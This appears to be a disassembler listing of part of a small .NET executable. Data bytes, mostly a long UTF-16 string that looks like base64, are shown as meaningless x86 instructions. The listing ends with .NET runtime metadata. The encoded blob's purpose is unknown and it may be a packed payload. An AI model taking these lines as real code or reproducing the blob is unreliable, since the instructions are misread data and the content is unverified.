  40c8e5:	64 00 7a 00          	add    %bh,%fs:0x0(%edx)
  40c8e9:	73 00                	jae    0x40c8eb
  40c8eb:	78 00                	js     0x40c8ed
  40c8ed:	47                   	inc    %edi
  40c8ee:	00 75 00             	add    %dh,0x0(%ebp)
  40c8f1:	67 00 78 00          	add    %bh,0x0(%bx,%si)
  40c8f5:	48                   	dec    %eax
  40c8f6:	00 42 00             	add    %al,0x0(%edx)
  40c8f9:	37                   	aaa
  40c8fa:	00 2f                	add    %ch,(%edi)
  40c8fc:	00 79 00             	add    %bh,0x0(%ecx)
  40c8ff:	73 00                	jae    0x40c901
  40c901:	38 00                	cmp    %al,(%eax)
  40c903:	4b                   	dec    %ebx
  40c904:	00 6d 00             	add    %ch,0x0(%ebp)
  40c907:	52                   	push   %edx
  40c908:	00 73 00             	add    %dh,0x0(%ebx)
  40c90b:	57                   	push   %edi
  40c90c:	00 79 00             	add    %bh,0x0(%ecx)
  40c90f:	44                   	inc    %esp
  40c910:	00 6e 00             	add    %ch,0x0(%esi)
  40c913:	73 00                	jae    0x40c915
  40c915:	44                   	inc    %esp
  40c916:	00 52 00             	add    %dl,0x0(%edx)
  40c919:	64 00 52 00          	add    %dl,%fs:0x0(%edx)
  40c91d:	2b 00                	sub    (%eax),%eax
  40c91f:	38 00                	cmp    %al,(%eax)
  40c921:	36 00 4b 00          	add    %cl,%ss:0x0(%ebx)
  40c925:	4f                   	dec    %edi
  40c926:	00 2f                	add    %ch,(%edi)
  40c928:	00 56 00             	add    %dl,0x0(%esi)
  40c92b:	7a 00                	jp     0x40c92d
  40c92d:	6a 00                	push   $0x0
  40c92f:	30 00                	xor    %al,(%eax)
  40c931:	67 00 61 00          	add    %ah,0x0(%bx,%di)
  40c935:	45                   	inc    %ebp
  40c936:	00 4d 00             	add    %cl,0x0(%ebp)
  40c939:	74 00                	je     0x40c93b
  40c93b:	4f                   	dec    %edi
  40c93c:	00 38                	add    %bh,(%eax)
  40c93e:	00 5a 00             	add    %bl,0x0(%edx)
  40c941:	58                   	pop    %eax
  40c942:	00 4d 00             	add    %cl,0x0(%ebp)
  40c945:	6a 00                	push   $0x0
  40c947:	6d                   	insl   (%dx),%es:(%edi)
  40c948:	00 6f 00             	add    %ch,0x0(%edi)
  40c94b:	77 00                	ja     0x40c94d
  40c94d:	75 00                	jne    0x40c94f
  40c94f:	45                   	inc    %ebp
  40c950:	00 7a 00             	add    %bh,0x0(%edx)
  40c953:	44                   	inc    %esp
  40c954:	00 7a 00             	add    %bh,0x0(%edx)
  40c957:	6d                   	insl   (%dx),%es:(%edi)
  40c958:	00 45 00             	add    %al,0x0(%ebp)
  40c95b:	6a 00                	push   $0x0
  40c95d:	51                   	push   %ecx
  40c95e:	00 61 00             	add    %ah,0x0(%ecx)
  40c961:	51                   	push   %ecx
  40c962:	00 49 00             	add    %cl,0x0(%ecx)
  40c965:	52                   	push   %edx
  40c966:	00 59 00             	add    %bl,0x0(%ecx)
  40c969:	76 00                	jbe    0x40c96b
  40c96b:	6a 00                	push   $0x0
  40c96d:	51                   	push   %ecx
  40c96e:	00 45 00             	add    %al,0x0(%ebp)
  40c971:	32 00                	xor    (%eax),%al
  40c973:	48                   	dec    %eax
  40c974:	00 58 00             	add    %bl,0x0(%eax)
  40c977:	42                   	inc    %edx
  40c978:	00 55 00             	add    %dl,0x0(%ebp)
  40c97b:	53                   	push   %ebx
  40c97c:	00 70 00             	add    %dh,0x0(%eax)
  40c97f:	4b                   	dec    %ebx
  40c980:	00 71 00             	add    %dh,0x0(%ecx)
  40c983:	6d                   	insl   (%dx),%es:(%edi)
  40c984:	00 6c 00 44          	add    %ch,0x44(%eax,%eax,1)
  40c988:	00 73 00             	add    %dh,0x0(%ebx)
  40c98b:	48                   	dec    %eax
  40c98c:	00 56 00             	add    %dl,0x0(%esi)
  40c98f:	77 00                	ja     0x40c991
  40c991:	35 00 4e 00 73       	xor    $0x73004e00,%eax
  40c996:	00 4e 00             	add    %cl,0x0(%esi)
  40c999:	55                   	push   %ebp
  40c99a:	00 4d 00             	add    %cl,0x0(%ebp)
  40c99d:	47                   	inc    %edi
  40c99e:	00 64 00 36          	add    %ah,0x36(%eax,%eax,1)
  40c9a2:	00 4d 00             	add    %cl,0x0(%ebp)
  40c9a5:	4d                   	dec    %ebp
  40c9a6:	00 71 00             	add    %dh,0x0(%ecx)
  40c9a9:	75 00                	jne    0x40c9ab
  40c9ab:	49                   	dec    %ecx
  40c9ac:	00 6a 00             	add    %ch,0x0(%edx)
  40c9af:	33 00                	xor    (%eax),%eax
  40c9b1:	6c                   	insb   (%dx),%es:(%edi)
  40c9b2:	00 6c 00 76          	add    %ch,0x76(%eax,%eax,1)
  40c9b6:	00 44 00 47          	add    %al,0x47(%eax,%eax,1)
  40c9ba:	00 41 00             	add    %al,0x0(%ecx)
  40c9bd:	34 00                	xor    $0x0,%al
  40c9bf:	32 00                	xor    (%eax),%al
  40c9c1:	77 00                	ja     0x40c9c3
  40c9c3:	6b 00 49             	imul   $0x49,(%eax),%eax
  40c9c6:	00 59 00             	add    %bl,0x0(%ecx)
  40c9c9:	71 00                	jno    0x40c9cb
  40c9cb:	50                   	push   %eax
  40c9cc:	00 73 00             	add    %dh,0x0(%ebx)
  40c9cf:	41                   	inc    %ecx
  40c9d0:	00 71 00             	add    %dh,0x0(%ecx)
  40c9d3:	78 00                	js     0x40c9d5
  40c9d5:	55                   	push   %ebp
  40c9d6:	00 31                	add    %dh,(%ecx)
  40c9d8:	00 79 00             	add    %bh,0x0(%ecx)
  40c9db:	4c                   	dec    %esp
  40c9dc:	00 35 00 68 00 74    	add    %dh,0x74006800
  40c9e2:	00 4c 00 52          	add    %cl,0x52(%eax,%eax,1)
  40c9e6:	00 6b 00             	add    %ch,0x0(%ebx)
  40c9e9:	75 00                	jne    0x40c9eb
  40c9eb:	52                   	push   %edx
  40c9ec:	00 65 00             	add    %ah,0x0(%ebp)
  40c9ef:	54                   	push   %esp
  40c9f0:	00 58 00             	add    %bl,0x0(%eax)
  40c9f3:	41                   	inc    %ecx
  40c9f4:	00 6f 00             	add    %ch,0x0(%edi)
  40c9f7:	6c                   	insb   (%dx),%es:(%edi)
  40c9f8:	00 4f 00             	add    %cl,0x0(%edi)
  40c9fb:	76 00                	jbe    0x40c9fd
  40c9fd:	72 00                	jb     0x40c9ff
  40c9ff:	69 00 44 00 4e 00    	imul   $0x4e0044,(%eax),%eax
  40ca05:	2b 00                	sub    (%eax),%eax
  40ca07:	55                   	push   %ebp
  40ca08:	00 6c 00 4b          	add    %ch,0x4b(%eax,%eax,1)
  40ca0c:	00 4f 00             	add    %cl,0x0(%edi)
  40ca0f:	4e                   	dec    %esi
  40ca10:	00 61 00             	add    %ah,0x0(%ecx)
  40ca13:	78 00                	js     0x40ca15
  40ca15:	76 00                	jbe    0x40ca17
  40ca17:	68 00 66 00 34       	push   $0x34006600
  40ca1c:	00 39                	add    %bh,(%ecx)
  40ca1e:	00 38                	add    %bh,(%eax)
  40ca20:	00 30                	add    %dh,(%eax)
  40ca22:	00 5a 00             	add    %bl,0x0(%edx)
  40ca25:	57                   	push   %edi
  40ca26:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ca29:	69 00 44 00 79 00    	imul   $0x790044,(%eax),%eax
  40ca2f:	55                   	push   %ebp
  40ca30:	00 68 00             	add    %ch,0x0(%eax)
  40ca33:	36 00 66 00          	add    %ah,%ss:0x0(%esi)
  40ca37:	41                   	inc    %ecx
  40ca38:	00 52 00             	add    %dl,0x0(%edx)
  40ca3b:	48                   	dec    %eax
  40ca3c:	00 63 00             	add    %ah,0x0(%ebx)
  40ca3f:	37                   	aaa
  40ca40:	00 77 00             	add    %dh,0x0(%edi)
  40ca43:	55                   	push   %ebp
  40ca44:	00 58 00             	add    %bl,0x0(%eax)
  40ca47:	4c                   	dec    %esp
  40ca48:	00 58 00             	add    %bl,0x0(%eax)
  40ca4b:	6b 00 58             	imul   $0x58,(%eax),%eax
  40ca4e:	00 4d 00             	add    %cl,0x0(%ebp)
  40ca51:	4f                   	dec    %edi
  40ca52:	00 32                	add    %dh,(%edx)
  40ca54:	00 45 00             	add    %al,0x0(%ebp)
  40ca57:	4d                   	dec    %ebp
  40ca58:	00 66 00             	add    %ah,0x0(%esi)
  40ca5b:	42                   	inc    %edx
  40ca5c:	00 61 00             	add    %ah,0x0(%ecx)
  40ca5f:	47                   	inc    %edi
  40ca60:	00 51 00             	add    %dl,0x0(%ecx)
  40ca63:	59                   	pop    %ecx
  40ca64:	00 44 00 32          	add    %al,0x32(%eax,%eax,1)
  40ca68:	00 51 00             	add    %dl,0x0(%ecx)
  40ca6b:	43                   	inc    %ebx
  40ca6c:	00 39                	add    %bh,(%ecx)
  40ca6e:	00 43 00             	add    %al,0x0(%ebx)
  40ca71:	2f                   	das
  40ca72:	00 31                	add    %dh,(%ecx)
  40ca74:	00 42 00             	add    %al,0x0(%edx)
  40ca77:	45                   	inc    %ebp
  40ca78:	00 7a 00             	add    %bh,0x0(%edx)
  40ca7b:	44                   	inc    %esp
  40ca7c:	00 62 00             	add    %ah,0x0(%edx)
  40ca7f:	39 00                	cmp    %eax,(%eax)
  40ca81:	6e                   	outsb  %ds:(%esi),(%dx)
  40ca82:	00 4d 00             	add    %cl,0x0(%ebp)
  40ca85:	4e                   	dec    %esi
  40ca86:	00 35 00 61 00 62    	add    %dh,0x62006100
  40ca8c:	00 79 00             	add    %bh,0x0(%ecx)
  40ca8f:	31 00                	xor    %eax,(%eax)
  40ca91:	70 00                	jo     0x40ca93
  40ca93:	41                   	inc    %ecx
  40ca94:	00 4f 00             	add    %cl,0x0(%edi)
  40ca97:	51                   	push   %ecx
  40ca98:	00 45 00             	add    %al,0x0(%ebp)
  40ca9b:	4c                   	dec    %esp
  40ca9c:	00 78 00             	add    %bh,0x0(%eax)
  40ca9f:	6b 00 56             	imul   $0x56,(%eax),%eax
  40caa2:	00 4e 00             	add    %cl,0x0(%esi)
  40caa5:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40caa9:	64 00 51 00          	add    %dl,%fs:0x0(%ecx)
  40caad:	51                   	push   %ecx
  40caae:	00 70 00             	add    %dh,0x0(%eax)
  40cab1:	71 00                	jno    0x40cab3
  40cab3:	50                   	push   %eax
  40cab4:	00 46 00             	add    %al,0x0(%esi)
  40cab7:	49                   	dec    %ecx
  40cab8:	00 35 00 52 00 62    	add    %dh,0x62005200
  40cabe:	00 33                	add    %dh,(%ebx)
  40cac0:	00 45 00             	add    %al,0x0(%ebp)
  40cac3:	5a                   	pop    %edx
  40cac4:	00 4b 00             	add    %cl,0x0(%ebx)
  40cac7:	63 00                	arpl   %eax,(%eax)
  40cac9:	53                   	push   %ebx
  40caca:	00 39                	add    %bh,(%ecx)
  40cacc:	00 51 00             	add    %dl,0x0(%ecx)
  40cacf:	4e                   	dec    %esi
  40cad0:	00 5a 00             	add    %bl,0x0(%edx)
  40cad3:	71 00                	jno    0x40cad5
  40cad5:	7a 00                	jp     0x40cad7
  40cad7:	49                   	dec    %ecx
  40cad8:	00 45 00             	add    %al,0x0(%ebp)
  40cadb:	50                   	push   %eax
  40cadc:	00 32                	add    %dh,(%edx)
  40cade:	00 64 00 38          	add    %ah,0x38(%eax,%eax,1)
  40cae2:	00 6b 00             	add    %ch,0x0(%ebx)
  40cae5:	67 00 77 00          	add    %dh,0x0(%bx)
  40cae9:	57                   	push   %edi
  40caea:	00 31                	add    %dh,(%ecx)
  40caec:	00 63 00             	add    %ah,0x0(%ebx)
  40caef:	59                   	pop    %ecx
  40caf0:	00 2f                	add    %ch,(%edi)
  40caf2:	00 5a 00             	add    %bl,0x0(%edx)
  40caf5:	34 00                	xor    $0x0,%al
  40caf7:	54                   	push   %esp
  40caf8:	00 76 00             	add    %dh,0x0(%esi)
  40cafb:	48                   	dec    %eax
  40cafc:	00 2b                	add    %ch,(%ebx)
  40cafe:	00 75 00             	add    %dh,0x0(%ebp)
  40cb01:	42                   	inc    %edx
  40cb02:	00 45 00             	add    %al,0x0(%ebp)
  40cb05:	49                   	dec    %ecx
  40cb06:	00 41 00             	add    %al,0x0(%ecx)
  40cb09:	46                   	inc    %esi
  40cb0a:	00 2f                	add    %ch,(%edi)
  40cb0c:	00 79 00             	add    %bh,0x0(%ecx)
  40cb0f:	35 00 66 00 65       	xor    $0x65006600,%eax
  40cb14:	00 46 00             	add    %al,0x0(%esi)
  40cb17:	46                   	inc    %esi
  40cb18:	00 6b 00             	add    %ch,0x0(%ebx)
  40cb1b:	6b 00 30             	imul   $0x30,(%eax),%eax
  40cb1e:	00 58 00             	add    %bl,0x0(%eax)
  40cb21:	64 00 4a 00          	add    %cl,%fs:0x0(%edx)
  40cb25:	30 00                	xor    %al,(%eax)
  40cb27:	35 00 68 00 42       	xor    $0x42006800,%eax
  40cb2c:	00 6d 00             	add    %ch,0x0(%ebp)
  40cb2f:	6a 00                	push   $0x0
  40cb31:	2b 00                	sub    (%eax),%eax
  40cb33:	53                   	push   %ebx
  40cb34:	00 56 00             	add    %dl,0x0(%esi)
  40cb37:	47                   	inc    %edi
  40cb38:	00 75 00             	add    %dh,0x0(%ebp)
  40cb3b:	37                   	aaa
  40cb3c:	00 30                	add    %dh,(%eax)
  40cb3e:	00 54 00 66          	add    %dl,0x66(%eax,%eax,1)
  40cb42:	00 56 00             	add    %dl,0x0(%esi)
  40cb45:	45                   	inc    %ebp
  40cb46:	00 67 00             	add    %ah,0x0(%edi)
  40cb49:	6b 00 67             	imul   $0x67,(%eax),%eax
  40cb4c:	00 42 00             	add    %al,0x0(%edx)
  40cb4f:	2f                   	das
  40cb50:	00 4d 00             	add    %cl,0x0(%ebp)
  40cb53:	43                   	inc    %ebx
  40cb54:	00 55 00             	add    %dl,0x0(%ebp)
  40cb57:	31 00                	xor    %eax,(%eax)
  40cb59:	32 00                	xor    (%eax),%al
  40cb5b:	62 00                	bound  %eax,(%eax)
  40cb5d:	70 00                	jo     0x40cb5f
  40cb5f:	4c                   	dec    %esp
  40cb60:	00 4a 00             	add    %cl,0x0(%edx)
  40cb63:	44                   	inc    %esp
  40cb64:	00 55 00             	add    %dl,0x0(%ebp)
  40cb67:	62 00                	bound  %eax,(%eax)
  40cb69:	34 00                	xor    $0x0,%al
  40cb6b:	74 00                	je     0x40cb6d
  40cb6d:	35 00 59 00 31       	xor    $0x31005900,%eax
  40cb72:	00 4f 00             	add    %cl,0x0(%edi)
  40cb75:	74 00                	je     0x40cb77
  40cb77:	47                   	inc    %edi
  40cb78:	00 6e 00             	add    %ch,0x0(%esi)
  40cb7b:	77 00                	ja     0x40cb7d
  40cb7d:	6a 00                	push   $0x0
  40cb7f:	46                   	inc    %esi
  40cb80:	00 37                	add    %dh,(%edi)
  40cb82:	00 75 00             	add    %dh,0x0(%ebp)
  40cb85:	4d                   	dec    %ebp
  40cb86:	00 35 00 74 00 45    	add    %dh,0x45007400
  40cb8c:	00 56 00             	add    %dl,0x0(%esi)
  40cb8f:	5a                   	pop    %edx
  40cb90:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40cb94:	00 33                	add    %dh,(%ebx)
  40cb96:	00 79 00             	add    %bh,0x0(%ecx)
  40cb99:	44                   	inc    %esp
  40cb9a:	00 4a 00             	add    %cl,0x0(%edx)
  40cb9d:	2f                   	das
  40cb9e:	00 76 00             	add    %dh,0x0(%esi)
  40cba1:	70 00                	jo     0x40cba3
  40cba3:	52                   	push   %edx
  40cba4:	00 37                	add    %dh,(%edi)
  40cba6:	00 71 00             	add    %dh,0x0(%ecx)
  40cba9:	33 00                	xor    (%eax),%eax
  40cbab:	72 00                	jb     0x40cbad
  40cbad:	45                   	inc    %ebp
  40cbae:	00 77 00             	add    %dh,0x0(%edi)
  40cbb1:	71 00                	jno    0x40cbb3
  40cbb3:	58                   	pop    %eax
  40cbb4:	00 34 00             	add    %dh,(%eax,%eax,1)
  40cbb7:	6e                   	outsb  %ds:(%esi),(%dx)
  40cbb8:	00 48 00             	add    %cl,0x0(%eax)
  40cbbb:	4d                   	dec    %ebp
  40cbbc:	00 68 00             	add    %ch,0x0(%eax)
  40cbbf:	59                   	pop    %ecx
  40cbc0:	00 70 00             	add    %dh,0x0(%eax)
  40cbc3:	53                   	push   %ebx
  40cbc4:	00 41 00             	add    %al,0x0(%ecx)
  40cbc7:	31 00                	xor    %eax,(%eax)
  40cbc9:	5a                   	pop    %edx
  40cbca:	00 50 00             	add    %dl,0x0(%eax)
  40cbcd:	4d                   	dec    %ebp
  40cbce:	00 49 00             	add    %cl,0x0(%ecx)
  40cbd1:	49                   	dec    %ecx
  40cbd2:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40cbd6:	00 4e 00             	add    %cl,0x0(%esi)
  40cbd9:	7a 00                	jp     0x40cbdb
  40cbdb:	54                   	push   %esp
  40cbdc:	00 77 00             	add    %dh,0x0(%edi)
  40cbdf:	36 00 4e 00          	add    %cl,%ss:0x0(%esi)
  40cbe3:	56                   	push   %esi
  40cbe4:	00 58 00             	add    %bl,0x0(%eax)
  40cbe7:	59                   	pop    %ecx
  40cbe8:	00 39                	add    %bh,(%ecx)
  40cbea:	00 2f                	add    %ch,(%edi)
  40cbec:	00 70 00             	add    %dh,0x0(%eax)
  40cbef:	75 00                	jne    0x40cbf1
  40cbf1:	78 00                	js     0x40cbf3
  40cbf3:	76 00                	jbe    0x40cbf5
  40cbf5:	4f                   	dec    %edi
  40cbf6:	00 6f 00             	add    %ch,0x0(%edi)
  40cbf9:	66 00 32             	data16 add %dh,(%edx)
  40cbfc:	00 4c 00 55          	add    %cl,0x55(%eax,%eax,1)
  40cc00:	00 75 00             	add    %dh,0x0(%ebp)
  40cc03:	4e                   	dec    %esi
  40cc04:	00 46 00             	add    %al,0x0(%esi)
  40cc07:	44                   	inc    %esp
  40cc08:	00 4e 00             	add    %cl,0x0(%esi)
  40cc0b:	6e                   	outsb  %ds:(%esi),(%dx)
  40cc0c:	00 34 00             	add    %dh,(%eax,%eax,1)
  40cc0f:	48                   	dec    %eax
  40cc10:	00 43 00             	add    %al,0x0(%ebx)
  40cc13:	6b 00 56             	imul   $0x56,(%eax),%eax
  40cc16:	00 51 00             	add    %dl,0x0(%ecx)
  40cc19:	58                   	pop    %eax
  40cc1a:	00 41 00             	add    %al,0x0(%ecx)
  40cc1d:	59                   	pop    %ecx
  40cc1e:	00 35 00 49 00 48    	add    %dh,0x48004900
  40cc24:	00 63 00             	add    %ah,0x0(%ebx)
  40cc27:	49                   	dec    %ecx
  40cc28:	00 44 00 79          	add    %al,0x79(%eax,%eax,1)
  40cc2c:	00 46 00             	add    %al,0x0(%esi)
  40cc2f:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  40cc33:	67 00 52 00          	add    %dl,0x0(%bp,%si)
  40cc37:	53                   	push   %ebx
  40cc38:	00 74 00 54          	add    %dh,0x54(%eax,%eax,1)
  40cc3c:	00 38                	add    %bh,(%eax)
  40cc3e:	00 52 00             	add    %dl,0x0(%edx)
  40cc41:	34 00                	xor    $0x0,%al
  40cc43:	2b 00                	sub    (%eax),%eax
  40cc45:	51                   	push   %ecx
  40cc46:	00 36                	add    %dh,(%esi)
  40cc48:	00 73 00             	add    %dh,0x0(%ebx)
  40cc4b:	62 00                	bound  %eax,(%eax)
  40cc4d:	6f                   	outsl  %ds:(%esi),(%dx)
  40cc4e:	00 6d 00             	add    %ch,0x0(%ebp)
  40cc51:	50                   	push   %eax
  40cc52:	00 45 00             	add    %al,0x0(%ebp)
  40cc55:	51                   	push   %ecx
  40cc56:	00 56 00             	add    %dl,0x0(%esi)
  40cc59:	45                   	inc    %ebp
  40cc5a:	00 36                	add    %dh,(%esi)
  40cc5c:	00 31                	add    %dh,(%ecx)
  40cc5e:	00 74 00 42          	add    %dh,0x42(%eax,%eax,1)
  40cc62:	00 69 00             	add    %ch,0x0(%ecx)
  40cc65:	4d                   	dec    %ebp
  40cc66:	00 45 00             	add    %al,0x0(%ebp)
  40cc69:	71 00                	jno    0x40cc6b
  40cc6b:	38 00                	cmp    %al,(%eax)
  40cc6d:	77 00                	ja     0x40cc6f
  40cc6f:	50                   	push   %eax
  40cc70:	00 4f 00             	add    %cl,0x0(%edi)
  40cc73:	55                   	push   %ebp
  40cc74:	00 46 00             	add    %al,0x0(%esi)
  40cc77:	47                   	inc    %edi
  40cc78:	00 76 00             	add    %dh,0x0(%esi)
  40cc7b:	53                   	push   %ebx
  40cc7c:	00 46 00             	add    %al,0x0(%esi)
  40cc7f:	74 00                	je     0x40cc81
  40cc81:	36 00 49 00          	add    %cl,%ss:0x0(%ecx)
  40cc85:	38 00                	cmp    %al,(%eax)
  40cc87:	76 00                	jbe    0x40cc89
  40cc89:	2b 00                	sub    (%eax),%eax
  40cc8b:	76 00                	jbe    0x40cc8d
  40cc8d:	00 00                	add    %al,(%eax)
  40cc8f:	00 77 73             	add    %dh,0x73(%edi)
  40cc92:	58                   	pop    %eax
  40cc93:	9b                   	fwait
  40cc94:	a2 24 26 40 b0       	mov    %al,0xb0402624
  40cc99:	aa                   	stos   %al,%es:(%edi)
  40cc9a:	87 d3                	xchg   %edx,%ebx
  40cc9c:	69 7c 9a 48 00 08 b7 	imul   $0x7ab70800,0x48(%edx,%ebx,4),%edi
  40cca3:	7a 
  40cca4:	5c                   	pop    %esp
  40cca5:	56                   	push   %esi
  40cca6:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40cca9:	89 02                	mov    %eax,(%edx)
  40ccab:	06                   	push   %es
  40ccac:	0e                   	push   %cs
  40ccad:	03 00                	add    (%eax),%eax
  40ccaf:	00 01                	add    %al,(%ecx)
  40ccb1:	08 00                	or     %al,(%eax)
  40ccb3:	03 1d 05 1d 05 0e    	add    0xe051d05,%ebx
  40ccb9:	0e                   	push   %cs
  40ccba:	04 20                	add    $0x20,%al
  40ccbc:	01 01                	add    %eax,(%ecx)
  40ccbe:	08 03                	or     %al,(%ebx)
  40ccc0:	20 00                	and    %al,(%eax)
  40ccc2:	01 04 01             	add    %eax,(%ecx,%eax,1)
  40ccc5:	00 00                	add    %al,(%eax)
  40ccc7:	00 05 00 01 01 11    	add    %al,0x11010100
  40cccd:	19 04 00             	sbb    %eax,(%eax,%eax,1)
  40ccd0:	01 01                	add    %eax,(%ecx)
  40ccd2:	08 05 00 01 1d 05    	or     %al,0x51d0100
  40ccd8:	0e                   	push   %cs
  40ccd9:	06                   	push   %es
  40ccda:	00 01                	add    %al,(%ecx)
  40ccdc:	12 25 1d 05 04 20    	adc    0x2004051d,%ah
  40cce2:	00 12                	add    %dl,(%edx)
  40cce4:	29 07                	sub    %eax,(%edi)
  40cce6:	00 02                	add    %al,(%edx)
  40cce8:	02 12                	add    (%edx),%dl
  40ccea:	29 12                	sub    %edx,(%edx)
  40ccec:	29 05 20 00 1d 12    	sub    %eax,0x121d0020
  40ccf2:	31 06                	xor    %eax,(%esi)
  40ccf4:	20 02                	and    %al,(%edx)
  40ccf6:	1c 1c                	sbb    $0x1c,%al
  40ccf8:	1d 1c 0c 07 05       	sbb    $0x5070c1c,%eax
  40ccfd:	1d 05 12 25 12       	sbb    $0x12251205,%eax
  40cd02:	29 1d 1c 1d 1c 04    	sub    %ebx,0x41c1d1c
  40cd08:	00 00                	add    %al,(%eax)
  40cd0a:	12 39                	adc    (%ecx),%bh
  40cd0c:	05 20 01 01 1d       	add    $0x1d010120,%eax
  40cd11:	05 05 20 01 01       	add    $0x1012005,%eax
  40cd16:	11 41 05             	adc    %eax,0x5(%ecx)
  40cd19:	20 01                	and    %al,(%ecx)
  40cd1b:	01 11                	add    %edx,(%ecx)
  40cd1d:	45                   	inc    %ebp
  40cd1e:	04 20                	add    $0x20,%al
  40cd20:	00 12                	add    %dl,(%edx)
  40cd22:	49                   	dec    %ecx
  40cd23:	08 20                	or     %ah,(%eax)
  40cd25:	03 1d 05 1d 05 08    	add    0x8051d05,%ebx
  40cd2b:	08 08                	or     %cl,(%eax)
  40cd2d:	07                   	pop    %es
  40cd2e:	03 12                	add    (%edx),%edx
  40cd30:	39 12                	cmp    %edx,(%edx)
  40cd32:	49                   	dec    %ecx
  40cd33:	1d 05 08 01 00       	sbb    $0x10805,%eax
  40cd38:	08 00                	or     %al,(%eax)
  40cd3a:	00 00                	add    %al,(%eax)
  40cd3c:	00 00                	add    %al,(%eax)
  40cd3e:	1e                   	push   %ds
  40cd3f:	01 00                	add    %eax,(%eax)
  40cd41:	01 00                	add    %eax,(%eax)
  40cd43:	54                   	push   %esp
  40cd44:	02 16                	add    (%esi),%dl
  40cd46:	57                   	push   %edi
  40cd47:	72 61                	jb     0x40cdaa
  40cd49:	70 4e                	jo     0x40cd99
  40cd4b:	6f                   	outsl  %ds:(%esi),(%dx)
  40cd4c:	6e                   	outsb  %ds:(%esi),(%dx)
  40cd4d:	45                   	inc    %ebp
  40cd4e:	78 63                	js     0x40cdb3
  40cd50:	65 70 74             	gs jo  0x40cdc7
  40cd53:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40cd5a:	77 73                	ja     0x40cdcf
  40cd5c:	01 00                	add    %eax,(%eax)
  40cd5e:	00 00                	add    %al,(%eax)
  40cd60:	88 cd                	mov    %cl,%ch
	...
  40cd6a:	00 00                	add    %al,(%eax)
  40cd6c:	9e                   	sahf
  40cd6d:	cd 00                	int    $0x0
  40cd6f:	00 00                	add    %al,(%eax)
  40cd71:	20 00                	and    %al,(%eax)
	...
  40cd87:	00 90 cd 00 00 00    	add    %dl,0xcd(%eax)
  40cd8d:	00 00                	add    %al,(%eax)
  40cd8f:	00 00                	add    %al,(%eax)
  40cd91:	00 5f 43             	add    %bl,0x43(%edi)
  40cd94:	6f                   	outsl  %ds:(%esi),(%dx)
  40cd95:	72 45                	jb     0x40cddc
  40cd97:	78 65                	js     0x40cdfe
  40cd99:	4d                   	dec    %ebp
  40cd9a:	61                   	popa
  40cd9b:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40cda2:	72 65                	jb     0x40ce09
  40cda4:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40cda8:	6c                   	insb   (%dx),%es:(%edi)
  40cda9:	00 00                	add    %al,(%eax)
  40cdab:	00 00                	add    %al,(%eax)
  40cdad:	00 ff                	add    %bh,%bh
  40cdaf:	25 00 20 40 00       	and    $0x402000,%eax
